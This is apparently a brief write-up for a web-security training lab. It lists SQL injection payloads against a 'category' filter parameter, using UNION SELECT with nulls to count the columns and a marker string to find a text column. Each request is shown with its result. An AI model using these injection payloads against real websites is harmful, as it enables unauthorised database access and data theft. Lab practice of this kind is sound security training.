#### First do the same queries as the previous labs to figure out the no. of columns available

```
/filter?category=Pets'+UNION+SELECT+null--            #Error response

/filter?category=Pets'+UNION+SELECT+null,null--       #Error response

/filter?category=Pets'+UNION+SELECT+null,null,null--  #200 OK
```

#### Then, add the text as asked in the lab question, e.g:- `ab3Wks`, to the queries below

```
/filter?category=Pets'+UNION+SELECT+'ab3Wks',null,null--   #Error response
/filter?category=Pets'+UNION+SELECT+null,'ab3Wks',null--   #200 OK
```
